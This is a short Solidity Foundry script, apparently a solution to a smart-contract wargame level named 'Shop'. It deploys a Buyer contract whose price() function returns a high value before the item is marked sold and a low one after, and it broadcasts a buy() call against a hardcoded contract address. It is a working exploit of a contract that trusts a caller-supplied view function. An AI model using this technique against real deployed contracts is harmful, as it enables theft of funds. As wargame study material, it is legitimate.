/// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract Buyer {
    IShop shop;

    constructor(IShop _shop) {
        shop = _shop;
    }

    function price() public view returns (uint256) {
        return shop.isSold() ? 1 : 100;
    }

    function buy() public {
        shop.buy();
    }
}

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

contract Shop is Script {
    function run() public {
        vm.startBroadcast();

        IShop shop = IShop(0xbc6fbE306a69aAeE6ae84fcA9Be35255dFd4F292);
        Buyer buyer = new Buyer(shop);
        buyer.buy();

        vm.stopBroadcast();
    }
}
